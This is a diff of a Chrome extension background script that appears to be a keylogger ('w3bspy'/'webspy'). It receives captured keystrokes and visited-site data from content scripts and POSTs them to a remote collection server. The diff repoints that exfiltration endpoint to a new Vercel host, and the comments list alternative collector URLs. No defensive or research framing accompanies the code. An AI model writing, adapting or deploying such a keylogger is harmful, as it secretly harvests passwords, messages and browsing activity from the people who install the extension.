@@ -1,7 +1,7 @@
 chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
   if (request.type === "keystroke") {
     console.log("Storing keystroke: " + request.data);
-    fetch('https://w3bspy-render.onrender.com/api/log-data', {
+    fetch('https://webspy-vercel.vercel.app/api/log-data', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -11,7 +11,7 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
   } else if (request.type === "site") {
     console.log("Detected site: " + request.data);
     // If no keystrokes were sent with the site information, set the keystroke field value to null
-    fetch('https://w3bspy-render.onrender.com/api/log-data', {
+    fetch('https://webspy-vercel.vercel.app/api/log-data', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -25,4 +25,4 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
 // fetch('http://YOUR_SERVER_IP_OR_DOMAIN:3000/log-data',  ==> Update this URL to work beyond localhost 
 // fetch('http://localhost:3000/log-data',  --> For localhost
 //fetch('https://w3bspy-render.onrender.com/api/log-data', ==> for server on render
-// fetch('https://w3b-spy-server.vercel.app/log-data', ==> for server on vercel
+// fetch('https://webspy-vercel.vercel.app/api/log-data', ==> for server on vercel
